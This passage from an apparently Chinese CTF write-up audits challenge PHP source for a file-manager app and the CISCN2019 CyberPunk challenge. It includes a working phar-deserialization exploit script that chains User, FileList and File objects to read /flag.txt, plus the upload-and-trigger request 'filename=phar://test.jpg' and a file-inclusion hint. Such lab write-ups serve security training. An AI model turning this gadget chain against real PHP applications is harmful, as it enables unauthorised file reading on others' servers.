class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">round</span>(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="download-php"><a href="#download-php" class="headerlink" title="download.php"></a>download.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="delete-php"><a href="#delete-php" class="headerlink" title="delete.php"></a>delete.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">detele</span>();</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;File not exist&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>审计完后发现是个<code>phar</code>反序列化，触发点在<code>delete.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;test.phar&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//实例一个phar对象供后续操作，后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>); </span><br><span class="line"><span class="comment">//开始缓冲对phar的写操作 </span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*设置识别phar拓展的标识stub，必须以 __HALT_COMPILER(); ?&gt; 结尾*/</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将反序列化的对象放入该文件中</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;filename = <span class="string">&quot;/flag.txt&quot;</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">FileList</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;db = <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将自定义的归档元数据meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//phar本质上是个压缩包，所以要添加压缩的文件和文件内容</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;evo1ution&quot;</span>); </span><br><span class="line"><span class="comment">//停止缓冲对phar的写操作</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到的<code>test.phar</code>直接改后缀变成<code>test.jpg</code>上传，不要抓包修改，会出问题，然后发包即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/delete.php</span><br><span class="line">POST：</span><br><span class="line">filename=phar://test.jpg</span><br></pre></td></tr></table></figure><h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2><p>查看源码有提示<code>&lt;!--?file=?--&gt;</code>，直接用<code>filter</code>去读源码</p><h3 id="index-php-1"><a href="#index-php-1" class="headerlink" title="index.php"></a>index.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $file = $_GET[&quot;file&quot;];</span></span><br><span class="line"><span class="variable">$file</span> = (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;</span>,<span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;no way!&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;index&lt;/title&gt;</span><br><span class="line">&lt;base href=<span class="string">&quot;./&quot;</span>&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/bootstrap.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/custom-animations.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/style.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;h&quot;</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h2</span>&gt;2077发售了,不来份实体典藏版吗?&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">img</span> <span class="title">class</span>=&quot;<span class="title">logo</span>&quot; <span class="title">src</span>=&quot;./<span class="title">assets</span>/<span class="title">img</span>/<span class="title">logo</span>-<span class="title">en</span>.<span class="title">png</span>&quot;&gt;&lt;!--<span class="title">LOGOLOGOLOGOLOGO</span>--&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-8 <span class="title">col</span>-<span class="title">md</span>-<span class="title">offset</span>-2 <span class="title">centered</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">h3</span>&gt;提交订单&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">form</span> <span class="title">role</span>=&quot;<span class="title">form</span>&quot; <span class="title">action</span>=&quot;./<span class="title">confirm</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">enctype</span>=&quot;<span class="title">application</span>/<span class="title">x</span>-<span class="title">www</span>-<span class="title">urlencoded</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;姓名:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">subscribe</span>-<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">user_name</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;电话:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">subscribe</span>-<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">phone</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;地址:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">subscribe</span>-<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">address</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">button</span> <span class="title">class</span>=&#x27;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span>  <span class="title">btn</span>-<span class="title">sub</span> <span class="title">btn</span>-<span class="title">white</span>&#x27; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot;&gt;我正是送钱之人&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">f</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">mb</span>&quot;&gt;订单管理&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">search</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;我要查订单&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">change</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> 